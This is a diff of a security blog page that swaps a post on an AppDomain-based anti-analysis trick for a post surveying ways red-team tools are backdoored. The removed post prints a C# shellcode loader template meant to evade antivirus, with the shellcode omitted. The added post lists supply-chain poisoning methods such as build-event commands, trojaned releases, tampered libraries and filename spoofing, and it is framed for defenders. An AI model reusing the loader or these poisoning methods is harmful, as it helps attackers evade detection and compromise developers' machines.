@@ -16,26 +16,25 @@
   <meta name="author" content="qwqdanchun">
   <meta name="keywords" content="">
   
-    <meta name="description" content="这次是标题党了，主要还是记录一下自己在使用Appdomain中遇到的一点小坑 前情提要我一直很喜欢使用C#制作一些工具，或者制作一些技术的poc，在测试杀软对行为的拦截时为了避免频繁文件落地，都是使用对一个C#远控添加插件的方式测试的。 最常用的插件加载方式就是Assembly.Load了，使用过的都会发现这种方式可以加载不能卸载，用Procexp之类的软件可以很方便的查看进程内的Assembly">
+    <meta name="description" content="某大型活动还有一段时间，但是总会有很多新工具出现，想用但不敢用该怎么办，还是需要先了解下常见的源码投毒方式吧 方法1.代码带毒直接在代码中实现一个后门，常见的操作包括但不限于在程序启动时，按钮点击时，程序结束时等位置添加恶意代码。常见恶意代码为反向shell或各式各样的shellcode加载器 对于visual studio等编译器，不会在项目中显示未包含文件的代码，但是如果引用到了，依然会编译进">
 <meta property="og:type" content="article">
-<meta property="og:title" content="一种利用Appdomain特性实现隐蔽的反沙箱分析">
-<meta property="og:url" content="https://blog.qwqdanchun.com/Appdomain_AntiVM/index.html">
+<meta property="og:title" content="红队工具的投毒与防御">
+<meta property="og:url" content="https://blog.qwqdanchun.com/Backdoor_In_Source/index.html">
 <meta property="og:site_name" content="簞純&#39;s Blog">
-<meta property="og:description" content="这次是标题党了，主要还是记录一下自己在使用Appdomain中遇到的一点小坑 前情提要我一直很喜欢使用C#制作一些工具，或者制作一些技术的poc，在测试杀软对行为的拦截时为了避免频繁文件落地，都是使用对一个C#远控添加插件的方式测试的。 最常用的插件加载方式就是Assembly.Load了，使用过的都会发现这种方式可以加载不能卸载，用Procexp之类的软件可以很方便的查看进程内的Assembly">
+<meta property="og:description" content="某大型活动还有一段时间，但是总会有很多新工具出现，想用但不敢用该怎么办，还是需要先了解下常见的源码投毒方式吧 方法1.代码带毒直接在代码中实现一个后门，常见的操作包括但不限于在程序启动时，按钮点击时，程序结束时等位置添加恶意代码。常见恶意代码为反向shell或各式各样的shellcode加载器 对于visual studio等编译器，不会在项目中显示未包含文件的代码，但是如果引用到了，依然会编译进">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-02-17T01:29:19.000Z">
+<meta property="article:published_time" content="2023-05-09T07:12:17.000Z">
 <meta property="article:modified_time" content="2023-05-09T07:20:09.207Z">
 <meta property="article:author" content="qwqdanchun">
-<meta property="article:tag" content=".Net">
-<meta property="article:tag" content="Appdomain">
-<meta property="article:tag" content="Anti-VM">
+<meta property="article:tag" content="Backdoor">
+<meta property="article:tag" content="BlueTeam">
 <meta name="twitter:card" content="summary_large_image">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>一种利用Appdomain特性实现隐蔽的反沙箱分析 - 簞純&#39;s Blog</title>
+  <title>红队工具的投毒与防御 - 簞純&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -212,7 +211,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="一种利用Appdomain特性实现隐蔽的反沙箱分析"></span>
+            <span id="subtitle" data-typed-text="红队工具的投毒与防御"></span>
           
         </div>
 
@@ -228,8 +227,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-02-17 09:29" pubdate>
-          2023年2月17日 上午
+        <time datetime="2023-05-09 15:12" pubdate>
+          2023年5月9日 下午
         </time>
       </span>
     
@@ -240,7 +239,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.2k 字
+          1.2k 字
         
       </span>
     
@@ -251,7 +250,7 @@
         
         
         
-          27 分钟
+          10 分钟
         
       </span>
     
@@ -304,17 +303,17 @@
     
     <div class="category row nomargin-x">
       <a class="category-item 
-          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="Develop"
-        id="heading-1bedc6fb14c15b2e99872ebdbc317bf2" role="tab" data-toggle="collapse" href="#collapse-1bedc6fb14c15b2e99872ebdbc317bf2"
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="Backdoor"
+        id="heading-a22f53c72d82e19a7dc3fff940f35b62" role="tab" data-toggle="collapse" href="#collapse-a22f53c72d82e19a7dc3fff940f35b62"
         aria-expanded="true"
       >
-        Develop
-        <span class="list-group-count">(3)</span>
+        Backdoor
+        <span class="list-group-count">(1)</span>
         <i class="iconfont icon-arrowright"></i>
       </a>
       
-      <div class="category-collapse collapse show" id="collapse-1bedc6fb14c15b2e99872ebdbc317bf2"
-           role="tabpanel" aria-labelledby="heading-1bedc6fb14c15b2e99872ebdbc317bf2">
+      <div class="category-collapse collapse show" id="collapse-a22f53c72d82e19a7dc3fff940f35b62"
+           role="tabpanel" aria-labelledby="heading-a22f53c72d82e19a7dc3fff940f35b62">
         
         
           
@@ -323,28 +322,10 @@
     
       
       
-        <a href="/PrintNightmare/" title="PrintNightmare 实战利用Tips"
-           class="list-group-item list-group-item-action
-           ">
-          <span class="category-post">PrintNightmare 实战利用Tips</span>
-        </a>
-      
-    
-      
-      
-        <a href="/CobaltStrike_Modify/" title="CobaltStrike二次开发"
-           class="list-group-item list-group-item-action
-           ">
-          <span class="category-post">CobaltStrike二次开发</span>
-        </a>
-      
-    
-      
-      
-        <a href="/Appdomain_AntiVM/" title="一种利用Appdomain特性实现隐蔽的反沙箱分析"
+        <a href="/Backdoor_In_Source/" title="红队工具的投毒与防御"
            class="list-group-item list-group-item-action
            active">
-          <span class="category-post">一种利用Appdomain特性实现隐蔽的反沙箱分析</span>
+          <span class="category-post">红队工具的投毒与防御</span>
         </a>
       
     
@@ -367,7 +348,7 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">一种利用Appdomain特性实现隐蔽的反沙箱分析</h1>
+            <h1 style="display: none">红队工具的投毒与防御</h1>
             
               <p class="note note-info">
                 
@@ -380,26 +361,38 @@
             
               <div class="markdown-body">
                 
-                <p>这次是标题党了，主要还是记录一下自己在使用Appdomain中遇到的一点小坑</p>
-<h1 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h1><p>我一直很喜欢使用C#制作一些工具，或者制作一些技术的poc，在测试杀软对行为的拦截时为了避免频繁文件落地，都是使用对一个C#远控添加插件的方式测试的。</p>
-<p>最常用的插件加载方式就是Assembly.Load了，使用过的都会发现这种方式可以加载不能卸载，用Procexp之类的软件可以很方便的查看进程内的Assembly。虽然临时测试并不是太需要保证自身进程干净，但是还是想要解决一下这个问题。</p>
-<h1 id="解决过程"><a href="#解决过程" class="headerlink" title="解决过程"></a>解决过程</h1><p>在未提供接口卸载Assembly的情况下，最合适的方法是在新Appdomain中加载Assembly，并在使用后直接卸载Appdomain。</p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">var</span> appDomain = AppDomain.CreateDomain(<span class="hljs-string">&quot;Demo&quot;</span>);<br><span class="hljs-keyword">var</span> asm = appDomain.LoadFrom(<span class="hljs-string">&quot;test.dll&quot;</span>);<br>asm.EntryPoint.Invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>AppDomain.Unload(appDomain);<br></code></pre></td></tr></table></figure>
-
-<p>但是如果第二行改为使用Load函数，从内存中加载，就有可能发现FileNotFoundException的问题，这里就为后面的坑做下了铺垫，但是我没有在这里注意到这个问题。通过谷歌搜索发现了CreateInstanceAndUnwrap这个好东西，同时也想起来了之前收藏的文章<a target="_blank" rel="noopener" href="https://rastamouse.me/net-reflection-and-disposable-appdomains/">https://rastamouse.me/net-reflection-and-disposable-appdomains/</a>，所以参考文中实例，很快我就完成了自己远控中的加载执行的部分，并且完美通过调试</p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ShadowRunner</span> : <span class="hljs-title">MarshalByRefObject</span><br>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span>[] <span class="hljs-title">LoadAssembly</span>(<span class="hljs-params"><span class="hljs-built_in">byte</span>[] assembly, <span class="hljs-built_in">string</span>[] args, <span class="hljs-built_in">string</span> sMethod</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">var</span> asm = Assembly.Load(assembly);<br>        <span class="hljs-keyword">var</span> test = <span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>[] &#123; &#125;;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> type <span class="hljs-keyword">in</span> asm.GetTypes())<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> method <span class="hljs-keyword">in</span> type.GetMethods())<br>                <span class="hljs-keyword">if</span> (method.Name.ToLower().Equals(sMethod.ToLower()))<br>                    test = (<span class="hljs-built_in">string</span>[])method.Invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">object</span>[] &#123; args &#125;);<br>        <span class="hljs-keyword">return</span> test;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">loadAppDomainModule</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> sMethod, <span class="hljs-built_in">string</span> sAppDomain, <span class="hljs-built_in">byte</span>[] bMod</span>)</span><br>&#123;<br>    <span class="hljs-keyword">var</span> oDomain = AppDomain.CreateDomain(sAppDomain, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">false</span>);<br>    <span class="hljs-keyword">var</span> runner = (ShadowRunner)oDomain.CreateInstanceAndUnwrap(<span class="hljs-keyword">typeof</span>(ShadowRunner).Assembly.FullName,<br>        <span class="hljs-keyword">typeof</span>(ShadowRunner).FullName);<br>    <span class="hljs-keyword">var</span> result = runner.LoadAssembly(bMod, <span class="hljs-keyword">new</span>[] &#123; <span class="hljs-string">&quot;test&quot;</span> &#125;, sMethod);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>但是在实际使用过程中，把远控的client端转为shellcode，并随便套了一个加载器，之后就出现了问题，当时我就按照习惯把问题归为.Net历史遗留问题或者donut的实现问题，有可能是自己加载的CLR环境出现了问题，前后调试对比了很久也没有找出问题所在。</p>
-<p>还是后面想起来错误是FileNotFoundException，就看错误提示感觉很不合理，进而用Procmon跟了下，发现Appdomain加载程序集居然有一套类似dll搜索的搜索顺序，会在自身目录以及默认目录搜索文件，未发现文件就报错。</p>
-<p>这个问题的本质是Appdomain在CreateInstanceAndUnwrap中会根据程序集名称去磁盘上加载ShadowRunner所在程序集，从而产生一系列的问题，类似的情况在Appdomain的其他函数中也可以复现。</p>
-<p>可以说是完全断了这种操作的Assembly去做一些转化再免杀的方案，如果真想搞的话，可以hook一下自己进程的NtCreateFile等函数，让进程认为有这个文件嘛</p>
-<h1 id="附带的利用"><a href="#附带的利用" class="headerlink" title="附带的利用"></a>附带的利用</h1><p>坏消息是，动态加载卸载这个东西很难去做武器化了，好消息是，我们知道了Appdomain中找不到文件名对应的文件就不加载的特性（大概注意到这个问题的人不太多，毕竟按照写Assembly.Load的思路，不会遇到这个问题）</p>
-<p>所以就制作了一个简单的免杀模板（此处只展示加载部分）</p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.Runtime.InteropServices;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">test</span><br>&#123;<br>    <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span><br>    &#123;<br>        [<span class="hljs-meta">DllImport(<span class="hljs-string">&quot;ntdll.dll&quot;</span>)</span>]<br>        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">RtlMoveMemory</span>(<span class="hljs-params">IntPtr addr, <span class="hljs-built_in">byte</span>[] pay, <span class="hljs-built_in">uint</span> size</span>)</span>;<br>        [<span class="hljs-meta">DllImport(<span class="hljs-string">&quot;kernelbase.dll&quot;</span>)</span>]<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params">IntPtr lpAddress, <span class="hljs-built_in">uint</span> dwSize, <span class="hljs-built_in">int</span> flAllocationType, <span class="hljs-built_in">int</span> flProtect</span>)</span>;<br>        [<span class="hljs-meta">DllImport(<span class="hljs-string">&quot;kernel32.dll&quot;</span>)</span>]<br>        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">EnumUILanguagesA</span>(<span class="hljs-params">IntPtr lpUILanguageEnumProc, <span class="hljs-built_in">uint</span> dwFlags, IntPtr lParam</span>)</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-built_in">string</span>[] args</span>)</span><br>        &#123;<br>            AppDomain tempDomain = AppDomain.CreateDomain(<span class="hljs-string">&quot;Temp&quot;</span>);<br>            tempDomain.DoCallBack(Load);<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Load</span>()</span><br>        &#123;<br>            <span class="hljs-built_in">byte</span>[] shellcode = &#123; ...&#125;;<br>            IntPtr p = VirtualAlloc(IntPtr.Zero, (<span class="hljs-built_in">uint</span>)shellcode.Length, <span class="hljs-number">0x00001000</span>, <span class="hljs-number">0x0040</span>);<br>            RtlMoveMemory(p, shellcode, (<span class="hljs-built_in">uint</span>)shellcode.Length);<br>            EnumUILanguagesA(p, <span class="hljs-number">0</span>, IntPtr.Zero);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>编译后如果文件名与编译时设置的程序集名称不同的话，就无法执行，但是文件中不包含任何判断文件名的部分。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Appdomain加载卸载Assembly的思路我目前还没能完善，有待解决，但是顺路发现了一个比较隐蔽的小技巧，对于样本分析上会有一定的干扰作用，可以配合其他方法使用。（如故意添加一个判断自身文件名是否符合的函数，在分析人员用dnspy修改删除后发现还是文件名不符合执行不了一定会一脸懵逼，哈哈）</p>
-
+                <p>某大型活动还有一段时间，但是总会有很多新工具出现，想用但不敢用该怎么办，还是需要先了解下常见的源码投毒方式吧</p>
+<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><h2 id="1-代码带毒"><a href="#1-代码带毒" class="headerlink" title="1.代码带毒"></a>1.代码带毒</h2><p>直接在代码中实现一个后门，常见的操作包括但不限于在程序启动时，按钮点击时，程序结束时等位置添加恶意代码。常见恶意代码为反向shell或各式各样的shellcode加载器</p>
+<p>对于visual studio等编译器，不会在项目中显示未包含文件的代码，但是如果引用到了，依然会编译进去，vs项目可以用这种方式隐藏恶意代码，用户如果只使用visual studio查阅代码就很有可能忽略</p>
+<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>可定制化高，可以根据不同需求进行各种骚操作</p>
+<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>被发现，就会被发现</p>
+<h2 id="2-更新带毒"><a href="#2-更新带毒" class="headerlink" title="2.更新带毒"></a>2.更新带毒</h2><p>在程序的更新模块中直接下载或根据条件判断下载更高版本号的带毒文件并执行</p>
+<h3 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h3><p>程序不包含恶意代码，适合长期培养用户后一波带走</p>
+<h3 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h3><p>没有明显缺点</p>
+<h2 id="3-编译事件"><a href="#3-编译事件" class="headerlink" title="3.编译事件"></a>3.编译事件</h2><p>Visual Studio、IDEA等编译器为了方便编译前后进行准备及清理等工作，都支持编译前后的事件，可以指定命令行操作</p>
+<p>所以代码的vcxproj等文件也要注意，尤其很多人的开发机不装杀软</p>
+<h3 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h3><p>隐蔽，很难看出来问题，在编译时执行，更容易打下开发机</p>
+<h3 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h3><p>被发现，就会被发现</p>
+<h2 id="4-Release投毒"><a href="#4-Release投毒" class="headerlink" title="4.Release投毒"></a>4.Release投毒</h2><p>常见于Github项目，项目代码无问题，但是Release内编译成功的文件带有后门</p>
+<p>这个也是国内最常见的投毒方式</p>
+<h3 id="优点-3"><a href="#优点-3" class="headerlink" title="优点"></a>优点</h3><p>简单直接</p>
+<h3 id="缺点-3"><a href="#缺点-3" class="headerlink" title="缺点"></a>缺点</h3><p>只适合编译都不会的脚本小子</p>
+<h2 id="5-库文件投毒"><a href="#5-库文件投毒" class="headerlink" title="5.库文件投毒"></a>5.库文件投毒</h2><p>文件依赖的dll或lib文件很少有人注意，也可以进行投毒</p>
+<p>常见制作方法：</p>
+<p>.Net的dll，可以直接使用DnSpy修改；Native的dll，一般只修改有源码的，或者可以内存加载dll做函数转发；lib最合适，因为有编译器版本需求，较难找到替换，最适合投毒，详细步骤可以参考<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-276711.htm">Windows .lib 文件后门注入</a></p>
+<p>如果有人给你发了一份CobaltStrike的beacon源码，你真的会注意到其中的tomcrypt.lib有没有问题吗</p>
+<h3 id="优点-4"><a href="#优点-4" class="headerlink" title="优点"></a>优点</h3><p>隐蔽，很难看出来问题</p>
+<h3 id="缺点-4"><a href="#缺点-4" class="headerlink" title="缺点"></a>缺点</h3><p>制作难度大</p>
+<h2 id="6-文件名伪造"><a href="#6-文件名伪造" class="headerlink" title="6.文件名伪造"></a>6.文件名伪造</h2><p>Unicode反转字符，是一种古老的方法，绝大多数杀软都会查杀或提醒，但是很多开发机器不会安装杀软，就给了这个方法生存空间</p>
+<p>例如可以制作nls.scr结尾的文件，通过反转字符串使之看起来类似rcs.sln，配合图标可以伪装正常sln</p>
+<h3 id="优点-5"><a href="#优点-5" class="headerlink" title="优点"></a>优点</h3><p>无脑，制作简单</p>
+<h3 id="缺点-5"><a href="#缺点-5" class="headerlink" title="缺点"></a>缺点</h3><p>但凡有个杀软或者仔细看下呢</p>
+<h2 id="7-留漏洞"><a href="#7-留漏洞" class="headerlink" title="7.留漏洞"></a>7.留漏洞</h2><p>常见于远控、C2等部署于服务器的工具，在开发时保留漏洞不修复或使用带漏洞的库，并保留较为明显的指纹或通过报告信息等定位服务器ip，最后进行漏洞利用，获取权限</p>
+<p>例如可以在扫描器等工具中使用低版本Chromium内核，并自制水坑页面进行漏洞利用</p>
+<p>例如DcRat中就保留了AsyncRat中存在的目录穿越等漏洞未修复（还是拿自己的项目举例子吧，哈哈）</p>
+<h3 id="优点-6"><a href="#优点-6" class="headerlink" title="优点"></a>优点</h3><p>隐蔽，难发现</p>
+<h3 id="缺点-6"><a href="#缺点-6" class="headerlink" title="缺点"></a>缺点</h3><p>留漏洞比较头疼，扫全网很麻烦，容易被人怀疑开发水平</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>
                 
               </div>
             
@@ -417,7 +410,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/Develop/" class="category-chain-item">Develop</a>
+  <a href="/categories/Backdoor/" class="category-chain-item">Backdoor</a>
   
   
 
@@ -432,11 +425,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/Net/">#.Net</a>
+        <a href="/tags/Backdoor/">#Backdoor</a>
       
-        <a href="/tags/Appdomain/">#Appdomain</a>
-      
-        <a href="/tags/Anti-VM/">#Anti-VM</a>
+        <a href="/tags/BlueTeam/">#BlueTeam</a>
       
     </div>
   
@@ -448,8 +439,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>一种利用Appdomain特性实现隐蔽的反沙箱分析</div>
-      <div>https://blog.qwqdanchun.com/Appdomain_AntiVM/</div>
+      <div>红队工具的投毒与防御</div>
+      <div>https://blog.qwqdanchun.com/Backdoor_In_Source/</div>
     </div>
     <div class="license-meta">
       
@@ -461,7 +452,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年2月17日</div>
+          <div>2023年5月9日</div>
         </div>
       
       
@@ -504,18 +495,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/Bypass_Startup/" title="一个不太好用的过360启动方案">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">一个不太好用的过360启动方案</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/CobaltStrike_Modify/" title="CobaltStrike二次开发">
-                        <span class="hidden-mobile">CobaltStrike二次开发</span>
+                      <a href="/Pillager/" title="Pillager-一个浏览器信息提取工具">
+                        <span class="hidden-mobile">Pillager-一个浏览器信息提取工具</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -533,8 +518,8 @@
     
       <script type="text/javascript">
         var disqus_config = function() {
-          this.page.url = 'https://blog.qwqdanchun.com/Appdomain_AntiVM/';
-          this.page.identifier = '/Appdomain_AntiVM/';
+          this.page.url = 'https://blog.qwqdanchun.com/Backdoor_In_Source/';
+          this.page.identifier = '/Backdoor_In_Source/';
         };
         Fluid.utils.loadComments('#disqus_thread', function() {
           var d = document, s = d.createElement('script');
